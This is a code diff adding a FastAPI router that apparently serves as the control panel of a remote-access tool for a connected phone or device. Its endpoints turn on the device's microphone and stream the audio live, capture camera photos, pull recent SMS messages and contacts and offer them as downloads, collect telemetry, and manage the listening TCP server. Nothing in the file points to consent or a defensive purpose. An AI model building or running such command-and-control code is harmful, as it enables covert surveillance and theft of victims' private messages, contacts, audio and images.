@@ -1,0 +1,224 @@
+import io
+import json
+import os
+import threading
+import time
+import zipfile
+from typing import Any, Dict, List, Optional
+
+from fastapi import APIRouter, Response, WebSocket, WebSocketDisconnect
+
+from app.audio.broadcaster import add_audio_client, remove_audio_client
+from app.config import settings
+from app.logger import clear_logs, get_logs, log_info
+from app.state import state
+from app.tcp.commands import (
+    cmd_disconnect,
+    cmd_get_contacts,
+    cmd_get_sms,
+    cmd_get_telemetry,
+    cmd_list_cams,
+    cmd_stop_mic,
+    cmd_use_cam,
+    cmd_use_mic,
+)
+from app.tcp.server import start_tcp_server_action, stop_tcp_server_action
+
+router = APIRouter(prefix="/api")
+ws_router = APIRouter()
+
+
+@router.get("/status")
+async def api_status() -> Dict[str, Any]:
+    return {
+        "listening": state.listening,
+        "client_connected": state.client_connected(),
+        "client_addr": (
+            f"{state.client_addr[0]}:{state.client_addr[1]}"
+            if state.client_addr
+            else None
+        ),
+        "mic_active": state.mic_active,
+        "tcp_host": settings.tcp_host,
+        "tcp_port": settings.tcp_port,
+        "camera_enabled": settings.enable_camera,
+        "cameras": state.cameras if settings.enable_camera else [],
+        "has_photo": state.latest_photo_bytes is not None if settings.enable_camera else False,
+        "has_contacts": state.latest_contacts_bytes is not None,
+        "sms_count": len(state.latest_sms),
+        "contacts_count": len(state.contacts_list),
+        "has_telemetry": state.latest_telemetry is not None,
+        "telemetry": state.latest_telemetry,
+    }
+
+
+@router.get("/logs")
+async def api_logs() -> List[str]:
+    return get_logs()
+
+
+@router.post("/logs/clear")
+async def api_logs_clear() -> Dict[str, str]:
+    clear_logs()
+    return {"status": "cleared"}
+
+
+@router.post("/server/start")
+async def api_server_start() -> Dict[str, Any]:
+    return await start_tcp_server_action()
+
+
+@router.post("/server/stop")
+async def api_server_stop() -> Dict[str, str]:
+    return await stop_tcp_server_action()
+
+
+@router.post("/server/kill")
+async def api_server_kill() -> Dict[str, str]:
+    def kill_soon() -> None:
+        time.sleep(0.5)
+        os._exit(0)
+
+    threading.Thread(target=kill_soon, daemon=True).start()
+    return {"status": "killing"}
+
+
+@router.post("/client/disconnect")
+async def api_client_disconnect() -> Dict[str, str]:
+    return await cmd_disconnect()
+
+
+@router.post("/client/mic/start")
+async def api_mic_start() -> Dict[str, str]:
+    return await cmd_use_mic()
+
+
+@router.post("/client/mic/stop")
+async def api_mic_stop() -> Dict[str, str]:
+    return await cmd_stop_mic()
+
+
+@router.post("/client/contacts")
+async def api_client_contacts() -> Dict[str, Any]:
+    return await cmd_get_contacts()
+
+
+@router.post("/client/sms")
+async def api_client_sms(payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+    hours = 24
+    if payload and "hours" in payload:
+        try:
+            hours = int(payload["hours"])
+        except Exception:
+            hours = 24
+    return await cmd_get_sms(hours)
+
+
+@router.get("/sms/latest")
+async def api_sms_latest() -> List[Dict[str, Any]]:
+    return state.latest_sms
+
+
+@router.get("/sms/download")
+async def api_sms_download() -> Response:
+    content = json.dumps(state.latest_sms, indent=2, ensure_ascii=False).encode("utf-8")
+    return Response(
+        content=content,
+        media_type="application/json",
+        headers={"Content-Disposition": "attachment; filename=sms_messages.json"},
+    )
+
+
+@router.post("/client/cameras")
+async def api_client_cameras() -> Dict[str, Any]:
+    if not settings.enable_camera:
+        return {"status": "disabled", "message": "Camera feature is disabled", "data": []}
+    return await cmd_list_cams()
+
+
+@router.post("/client/camera/capture")
+async def api_client_camera_capture(payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+    if not settings.enable_camera:
+        return {"status": "disabled", "message": "Camera feature is disabled", "path": None}
+    cam_id = "0"
+    if payload and "cam_id" in payload:
+        cam_id = str(payload["cam_id"])
+    return await cmd_use_cam(cam_id)
+
+
+@router.post("/client/telemetry")
+async def api_client_telemetry() -> Dict[str, Any]:
+    return await cmd_get_telemetry()
+
+
+@router.get("/client/telemetry")
+async def api_client_telemetry_get() -> Dict[str, Any]:
+    return state.latest_telemetry or {}
+
+
+@router.get("/photo/latest")
+async def api_photo_latest() -> Response:
+    if not settings.enable_camera:
+        return Response(content=b"", status_code=404)
+    if state.latest_photo_bytes:
+        return Response(content=state.latest_photo_bytes, media_type="image/jpeg")
+    return Response(content=b"", status_code=404)
+
+
+@router.get("/contacts/download")
+async def api_contacts_download() -> Response:
+    if state.latest_contacts_bytes:
+        return Response(
+            content=state.latest_contacts_bytes,
+            media_type="application/zip",
+            headers={"Content-Disposition": "attachment; filename=contacts.zip"},
+        )
+    return Response(content=b"", status_code=404)
+
+
+@router.get("/contacts/list")
+async def api_contacts_list() -> Dict[str, Any]:
+    if state.contacts_list:
+        return {
+            "status": "ok",
+            "count": len(state.contacts_list),
+            "contacts": state.contacts_list,
+        }
+    if state.latest_contacts_bytes:
+        try:
+            if zipfile.is_zipfile(io.BytesIO(state.latest_contacts_bytes)):
+                zf = zipfile.ZipFile(io.BytesIO(state.latest_contacts_bytes))
+                if "contacts.json" in zf.namelist():
+                    with zf.open("contacts.json") as f:
+                        data = json.loads(f.read().decode("utf-8"))
+                        state.contacts_list = data
+                        return {"status": "ok", "count": len(data), "contacts": data}
+        except Exception as e:
+            return {"status": "error", "message": str(e), "contacts": []}
+    dest = settings.storage_dir / "contacts.zip"
+    if dest.exists():
+        try:
+            if zipfile.is_zipfile(dest):
+                with zipfile.ZipFile(dest) as zf:
+                    if "contacts.json" in zf.namelist():
+                        with zf.open("contacts.json") as f:
+                            data = json.loads(f.read().decode("utf-8"))
+                            state.contacts_list = data
+                            return {"status": "ok", "count": len(data), "contacts": data}
+        except Exception as e:
+            return {"status": "error", "message": str(e), "contacts": []}
+    return {"status": "none", "count": 0, "contacts": []}
+
+
+@ws_router.websocket("/ws/audio")
+@ws_router.websocket("/api/ws/audio")
+async def ws_audio(websocket: WebSocket) -> None:
+    await websocket.accept()
+    add_audio_client(websocket)
+    try:
+        while True:
+            await websocket.receive_bytes()
+    except WebSocketDisconnect:
+        pass
+    finally:
+        remove_audio_client(websocket)
